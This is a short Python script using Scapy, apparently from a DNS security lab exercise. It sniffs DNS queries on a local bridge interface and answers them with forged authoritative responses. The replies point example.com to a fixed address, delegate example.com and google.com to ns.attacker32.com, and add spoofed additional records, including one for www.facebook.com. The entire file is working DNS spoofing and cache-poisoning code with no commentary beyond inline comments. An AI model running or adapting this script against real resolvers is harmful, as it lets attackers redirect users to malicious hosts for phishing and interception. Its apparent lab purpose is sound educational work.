#!/usr/bin/env python3
from scapy.all import *

def spoof_dns(pkt):
  if (DNS in pkt and 'example.com' in pkt[DNS].qd.qname.decode('utf-8')):

    # Swap the source and destination IP address
    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

    # Swap the source and destination port number
    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

    # The Answer Section
    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                 ttl=259200, rdata='10.0.2.3')
    
    # The Authority Section
    NSsec1 = DNSRR(rrname='example.com', type='NS',
    ttl=259200, rdata='ns.attacker32.com')
    NSsec2 = DNSRR(rrname='google.com', type='NS',
    ttl=259200, rdata='ns.attacker32.com')

    Anssec1 = DNSRR(rrname="ns.attacker32.com",
                       type='A',
                       rdata='1.2.3.4',
                       ttl=259200)
    
    Anssec2 = DNSRR(rrname="ns.example.net",
                    type='A',
                    rdata='5.6.7.8',
                    ttl=259200)
    
    Anssec3 = DNSRR(rrname="www.facebook.com",
                    type='A',
                    rdata='3.4.5.6',
                       ttl=259200)

    # Construct the DNS packet
    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=2, arcount=3, ns = NSsec2/NSsec1, ar=Anssec3/Anssec2/Anssec1,
                 an=Anssec)

    # Construct the entire IP packet and send it out
    spoofpkt = IPpkt/UDPpkt/DNSpkt
    spoofpkt.show()
    send(spoofpkt)

# Sniff UDP query packets and invoke spoof_dns().
f = 'udp and dst port 53 and src host 10.9.0.53'
pkt = sniff(iface='br-b4db7f32bb2e', filter=f, prn=spoof_dns)      
